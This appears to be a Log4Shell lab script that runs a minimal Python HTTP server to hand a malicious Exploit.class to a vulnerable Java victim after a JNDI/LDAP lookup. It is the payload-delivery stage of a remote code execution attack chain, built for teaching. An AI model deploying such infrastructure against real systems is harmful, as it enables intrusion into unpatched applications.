#!/usr/bin/env python3
"""
SC3010 Log4Shell lab -- minimal HTTP server for the malicious codebase.

Serves the compiled Exploit.class (and anything else in the working directory)
on port 8000. The victim's URLClassLoader fetches Exploit.class from here after
the LDAP server hands it a JNDI Reference pointing at this codebase.

Standard library only (http.server).
"""

import http.server
import socketserver

PORT = 8000


class LoggingHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        # Make the class fetch obvious in the demo output.
        print("[HTTP] " + (fmt % args), flush=True)


class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True


def main():
    print(f"[HTTP] SC3010 lab codebase server on 0.0.0.0:{PORT} "
          f"(serving ./Exploit.class)", flush=True)
    with ReusableTCPServer(("0.0.0.0", PORT), LoggingHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("[HTTP] shutting down", flush=True)


if __name__ == "__main__":
    main()
